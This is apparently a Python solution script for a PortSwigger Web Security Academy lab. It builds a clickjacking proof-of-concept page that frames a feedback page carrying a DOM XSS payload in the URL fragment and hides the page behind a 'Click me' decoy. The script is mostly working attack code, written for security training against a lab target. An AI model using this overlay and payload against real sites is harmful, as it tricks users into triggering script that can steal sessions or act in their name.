"""
Lab 4: Exploiting clickjacking vulnerability to trigger DOM-based XSS
https://portswigger.net/web-security/clickjacking/lab-dom-xss
Difficulty: Practitioner

📝 The flaw: a page has a DOM XSS sink driven by a URL fragment (e.g. a
"feedback" link whose href comes straight from location.hash), but the sink
only fires once the user clicks something on the page — clickjacking is the
delivery mechanism to get an unsuspecting victim to make that click.

Goal: frame the vulnerable page with the XSS payload already in the
fragment, overlay a decoy over the exact clickable element, and get the
victim to trigger alert(document.cookie) (or similar, per the lab).
"""

from utils import get_session, log, note, check_framing_defenses

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
# Confirm the exact vulnerable page/param via source review in Burp first —
# this module's version commonly uses a feedback page with a hash-based sink.
VULNERABLE_PATH = "/feedback?name=test"
XSS_FRAGMENT = "#x=y&action=%27%3balert(document.domain)%2f%2f"
VULNERABLE_URL = f"{TARGET}{VULNERABLE_PATH}{XSS_FRAGMENT}"


def build_dom_xss_overlay_poc(target_url, button_top="300px", button_left="60px"):
    return f"""<style>
  iframe {{
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.0001;
    z-index: 2;
  }}
  div {{
    position: absolute;
    top: {button_top};
    left: {button_left};
    z-index: 1;
  }}
</style>
<div>Click me</div>
<iframe src="{target_url}"></iframe>"""


def run():
    s = get_session()
    check_framing_defenses(s, f"{TARGET}{VULNERABLE_PATH}")

    note("The XSS only fires on click — clickjacking just gets an unwitting")
    note("victim to make that exact click for us. Confirm the real sink/param")
    note("names from the page source before relying on the placeholder above.")

    html = build_dom_xss_overlay_poc(VULNERABLE_URL)

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")


if __name__ == "__main__":
    run()
